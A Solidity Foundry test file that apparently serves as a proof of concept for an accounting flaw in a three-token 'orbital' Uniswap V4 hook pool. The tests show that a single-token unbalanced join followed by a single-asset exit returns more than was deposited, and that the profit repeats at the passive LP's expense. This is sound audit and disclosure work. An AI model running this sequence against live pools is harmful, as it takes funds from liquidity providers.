// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.24;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeMultiAssetLiquidity as ILiq} from
    "contracts/interfaces/IStandardExchangeMultiAssetLiquidity.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {IVaultFeeOracleManager} from "contracts/interfaces/IVaultFeeOracleManager.sol";
import {TestBase_UniswapV4StandardExchangeOrbitalBufferHook as TB_Orbital} from
    "contracts/hooks/uniswap/v4/standardExchange/orbital/TestBase_UniswapV4StandardExchangeOrbitalBufferHook.sol";

interface IOrbitalUnbal {
    function joinUnbalanced(address[] calldata tokensIn, uint256[] calldata amounts, address to, uint256 sharesMin, uint256 deadline)
        external
        returns (uint256 shares);
    function previewJoinUnbalanced(address[] calldata tokensIn, uint256[] calldata amounts) external view returns (uint256);
}

/// @notice p4-hooks INV-1 break minimisation (orbital): single-token joinUnbalanced followed by a single-asset exit
///         back into the same token returns MORE than was deposited (closed cycle, fresh pool, no yield, no fees off).
contract P4OrbitalUnbalanced is TB_Orbital {
    address internal constant LP = address(0x1111);
    address internal constant ATK = address(0xA77);

    function setUp() public override {
        super.setUp();
        _setDexFee(3e15);
        _setUsageFee(1); // hook protocol fee off (phantom-fee quarantine)
        vm.prank(owner);
        IVaultFeeOracleManager(address(indexedexManager)).setUsageFeeOfVault(se0, 1); // SE dilution fee off
        SimpleMintableERC20[3] memory t = [token0, token1, token2];
        uint256[] memory a = new uint256[](3);
        for (uint256 i; i < 3; ++i) {
            t[i].mint(LP, 100_000e18);
            vm.prank(LP);
            t[i].approve(hook, type(uint256).max);
            vm.prank(ATK);
            t[i].approve(hook, type(uint256).max);
            a[i] = 100_000e18;
        }
        vm.prank(LP);
        ILiq(hook).joinProportional(a, LP, 0, block.timestamp + 1 hours);
    }

    function _tok(uint256 i) internal view returns (SimpleMintableERC20) {
        return i == 0 ? token0 : i == 1 ? token1 : token2;
    }

    function _lpPerShare() internal view returns (uint256) {
        uint256[] memory o = ILiq(hook).previewExitProportional(1e21);
        return (o[0] + o[1] + o[2]) * 1e18 / 1e21;
    }

    /// kind 0: joinUnbalanced single token; 1: zap joinSingleAssetExactIn. Exit: exitSingleAssetExactBptIn same token.
    function _cycle(uint256 i, uint256 x, uint256 kind) internal returns (int256 pnl, uint256 shares, uint256 pv) {
        SimpleMintableERC20 t = _tok(i);
        t.mint(ATK, x);
        address[] memory toks = new address[](1);
        toks[0] = address(t);
        uint256[] memory amts = new uint256[](1);
        amts[0] = x;
        if (kind == 0) {
            pv = IOrbitalUnbal(hook).previewJoinUnbalanced(toks, amts);
            vm.prank(ATK);
            shares = IOrbitalUnbal(hook).joinUnbalanced(toks, amts, ATK, 0, block.timestamp + 1 hours);
        } else {
            pv = ILiq(hook).previewJoinSingleAssetExactIn(address(t), x);
            vm.prank(ATK);
            shares = ILiq(hook).joinSingleAssetExactIn(address(t), x, ATK, 0, block.timestamp + 1 hours);
        }
        uint256 b0 = t.balanceOf(ATK);
        vm.prank(ATK);
        ILiq(hook).exitSingleAssetExactBptIn(address(t), shares, ATK, 0, block.timestamp + 1 hours);
        pnl = int256(t.balanceOf(ATK) - b0) - int256(x);
    }

    function test_orbital_unbalancedJoin_singleExit_cycle() public {
        uint256[3] memory xs = [uint256(1_000e18), 10_000e18, 30_000e18];
        for (uint256 i; i < 2; ++i) {
            for (uint256 s; s < 3; ++s) {
                for (uint256 kind; kind < 2; ++kind) {
                    uint256 snap = vm.snapshotState();
                    uint256 ps0 = _lpPerShare();
                    try this.cycleExt(i, xs[s], kind) returns (int256 pnl, uint256 sh, uint256 pv) {
                        console2.log(kind == 0 ? "joinUnbalanced" : "zapJoinSingle ", i, xs[s] / 1e18);
                        console2.log("   shares / preview", sh, pv);
                        console2.log("   cycle P&L (token units, wei)");
                        console2.logInt(pnl);
                        console2.log("   passive LP per-share delta");
                        console2.logInt(int256(_lpPerShare()) - int256(ps0));
                    } catch (bytes memory err) {
                        console2.log(kind == 0 ? "joinUnbalanced REVERT" : "zapJoinSingle REVERT", i, xs[s] / 1e18);
                        console2.logBytes(err);
                    }
                    vm.revertToState(snap);
                }
            }
        }
    }

    function cycleExt(uint256 i, uint256 x, uint256 kind) external returns (int256, uint256, uint256) {
        return _cycle(i, x, kind);
    }

    /// The minimised fuzzer counterexample, asserted: single-token joinUnbalanced(token0, 10k) + single exit profits.
    function test_orbital_unbalancedJoin_profit_10k() public {
        (int256 pnl,,) = _cycle(0, 9_999_999e15, 0);
        console2.log("P&L");
        console2.logInt(pnl);
        assertGt(pnl, 0, "closed single-token cycle returns more than deposited");
    }

    /// repeated attack: 5 closed cycles of 30k token0 (attacker's own capital, no flash loan).
    function test_orbital_unbalancedJoin_repeated() public {
        uint256[] memory o0 = ILiq(hook).previewExitProportional(IERC20(hook).balanceOf(LP));
        uint256 lp0 = o0[0] + o0[1] + o0[2];
        int256 total;
        for (uint256 c; c < 5; ++c) {
            (int256 pnl,,) = _cycle(0, 30_000e18, 0);
            total += pnl;
            console2.log("cycle", c);
            console2.logInt(pnl);
        }
        uint256[] memory o1 = ILiq(hook).previewExitProportional(IERC20(hook).balanceOf(LP));
        uint256 lp1 = o1[0] + o1[1] + o1[2];
        console2.log("attacker total profit (token0 wei)");
        console2.logInt(total);
        console2.log("passive LP fair value before / after", lp0, lp1);
        assertGt(total, 0, "repeatable profit");
        assertLt(lp1, lp0, "passive LP pays");
    }

    function test_orbital_unbalancedJoin_sizeSweep() public {
        uint256[4] memory xs = [uint256(50_000e18), 80_000e18, 120_000e18, 200_000e18];
        for (uint256 s; s < 4; ++s) {
            uint256 snap = vm.snapshotState();
            try this.cycleExt(0, xs[s], 0) returns (int256 pnl, uint256, uint256) {
                console2.log("size", xs[s] / 1e18);
                console2.logInt(pnl);
            } catch (bytes memory err) {
                console2.log("size REVERT", xs[s] / 1e18);
                console2.logBytes(err);
            }
            vm.revertToState(snap);
        }
    }
}
